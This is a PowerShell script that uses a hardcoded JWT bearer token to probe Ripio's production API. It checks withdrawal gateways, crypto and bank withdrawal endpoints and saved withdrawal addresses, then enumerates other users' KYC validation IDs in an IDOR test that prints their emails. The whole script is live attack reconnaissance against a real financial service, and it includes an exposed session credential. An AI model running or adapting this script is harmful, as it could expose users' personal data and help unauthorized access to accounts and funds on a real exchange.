$token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzY0NjEyMzc1LCJpYXQiOjE3NjQ2MTA0NDQsImp0aSI6IjdjOWY0MmFmNDJiZTQwMDRiNjc3NGU5ZDNiMmRmMzU4IiwidXNlcl91c2VyX3V1aWQiOiI2OTFlMjEzNi00OGJiLTRlNTUtOTMxOC1hNTk0YWM5YzNjZWMiLCJwcml2YXRlIjoiZ0FBQUFBQnBMZEdNazdFbnhLc3VtN2VkLXMxZlVvN3Y2Wld1UTVnTzlodHh6anJKMC1VX0RtSW1abVFwVldic0xqYWlRRTRDVE9IZ2E5dnRaSW5RT1paamFGZnZJVmJtRDVqcmFZbHRLZXpESGJqQ1A5bjhvU0RCTnRnaWhpOVBzRkZ6S1ZuZHR5Qndfakl5dVJPZDl2NDV5NUJRUG4wNlMxYVpNSWJBUDlZY20zVEp5SlU2ME42b3JwTW1uT2RzT19yR25EdXhhZEpiNjZVbXhiX0FGS2xBRTM5dnJieVVZcU05Mkl5V2N2UVFCVTAycXl5RWVVZUhaaEE0eGRiMVg0WUxSd2J4Z253dkRlTkh2Nnl2ZUNDWFM4cTV3ZHM0ZUw2a090eXkzNjVKbEtnRVdlUFc4XzBzazN1THJ0NWRDX2xZUjF3LXNOcjMiLCJ1YV9oYXNoIjoiZ0FBQUFBQnBMZEdNUE02VlNMTHlDM2ZMN2Y1QjNmeFkxSHVIamVpRjd3QUpKNms5YzR6WGpHLXR5V09iUjlvLTFicHBBQzB0TzdpRm16RTB2WFV5clNHZ05FTUxFMGU3Y2xmTVk0cEU3MEFvdndWdVVrSTJCRmQ4eTRQamZjVE1jUDA3dVlyaGw1OVVfTUMya3hoV0Q1d2tlZ2VDRlVjV0JmeEVTSlpua0ZhSlA0NWF0c1llaUlBPSIsImJhY2siOiJSSVBJTyIsImZpbmdlcnByaW50IjoiZjNkYmVkNDIxMDFjZjkzMDkzYTQwZjIyZGJiZmYyMzJiZjVlODgzYTM1M2NkOTZiZDdlNzIwZTlhY2U0ZDU1YSIsImhhc18yZmEiOmZhbHNlLCJpc19zdGFmZiI6ZmFsc2V9.cYdqwWCziszy4sOO3zkcTobjcGpk2neQniR3bwI4BDda-Io0pCxhzM8vTWE1bIphNbuC5ZRLKkzK2kwEydXoSbfE65rLZaPN8rH_-VqVmDeuNt4uEY29V92__oArkyEtqWa4B1dtwzOL1tzid7ipPQ_6sKDcq91sGTt_pULymAJWWlUoQxEN7Dp414xG9FqB2CB5ZVNoR23sReqab4LTuNWJzNDhoWX2DJsy_AHO75n_02ikmyI6Twh2IJ5hGGEnEmRc3OG3i7UdCb5agfzsdyucl0U28bSvrKwjku8iD6h4hMRXXGBGGMxpBJamOsdyJH5zd7MEnwx-NmxxgQONyA"

$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}

Write-Host "=== TESTING WITHDRAWAL CAPABILITY ===" -ForegroundColor Red

# Get withdrawal gateways
Write-Host "`n[1] Available withdrawal gateways:" -ForegroundColor Yellow
try {
    $gateways = Invoke-RestMethod -Uri "https://app.ripio.com/api/v3/transactions/gateways/" -Headers $headers -Method GET
    foreach ($gw in $gateways) {
        foreach ($action in $gw.actions) {
            if ($action.action -eq "WITHDRAWAL") {
                Write-Host "  Gateway: $($gw.gateway) - WITHDRAWAL available!" -ForegroundColor Green
            }
        }
    }
} catch {
    Write-Host "  Error: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
}

# Check crypto withdrawal endpoint
Write-Host "`n[2] Crypto withdrawal endpoint:" -ForegroundColor Yellow
try {
    $response = Invoke-RestMethod -Uri "https://app.ripio.com/api/v3/crypto/withdrawals/" -Headers $headers -Method GET -ErrorAction Stop
    Write-Host "  Endpoint exists! Response:" -ForegroundColor Green
    $response | ConvertTo-Json -Depth 2
} catch {
    $status = $_.Exception.Response.StatusCode.value__
    Write-Host "  Status: $status" -ForegroundColor $(if ($status -eq 404) { "Yellow" } else { "Red" })
}

# Check bank withdrawal endpoint
Write-Host "`n[3] Bank withdrawal endpoint:" -ForegroundColor Yellow
try {
    $response = Invoke-RestMethod -Uri "https://app.ripio.com/api/v3/fiat/withdrawals/" -Headers $headers -Method GET -ErrorAction Stop
    Write-Host "  Endpoint exists! Response:" -ForegroundColor Green
    $response | ConvertTo-Json -Depth 2
} catch {
    $status = $_.Exception.Response.StatusCode.value__
    Write-Host "  Status: $status" -ForegroundColor $(if ($status -eq 404) { "Yellow" } else { "Red" })
}

# Check addresses for withdrawal
Write-Host "`n[4] Saved withdrawal addresses:" -ForegroundColor Yellow
try {
    $response = Invoke-RestMethod -Uri "https://app.ripio.com/api/v3/addresses/" -Headers $headers -Method GET -ErrorAction Stop
    Write-Host "  Addresses found!" -ForegroundColor Green
    $response | ConvertTo-Json -Depth 2
} catch {
    $status = $_.Exception.Response.StatusCode.value__
    Write-Host "  Status: $status" -ForegroundColor $(if ($status -eq 404) { "Yellow" } else { "Red" })
}

# Check KYC IDOR
Write-Host "`n[5] KYC IDOR TEST - Access other user's data:" -ForegroundColor Yellow
$testIds = @(3418359, 3418361, 1, 100, 1000000)
foreach ($id in $testIds) {
    try {
        $response = Invoke-RestMethod -Uri "https://kyc-api.ripio.com/api/v2/validations/$id/" -Headers $headers -Method GET -ErrorAction Stop
        Write-Host "  ID $id - ACCESS GRANTED! IDOR FOUND!" -ForegroundColor Red
        Write-Host "    Email: $($response.email)" -ForegroundColor Magenta
    } catch {
        $status = $_.Exception.Response.StatusCode.value__
        if ($status -eq 403) {
            Write-Host "  ID $id - 403 Forbidden (protected)" -ForegroundColor Green
        } else {
            Write-Host "  ID $id - $status" -ForegroundColor Yellow
        }
    }
}
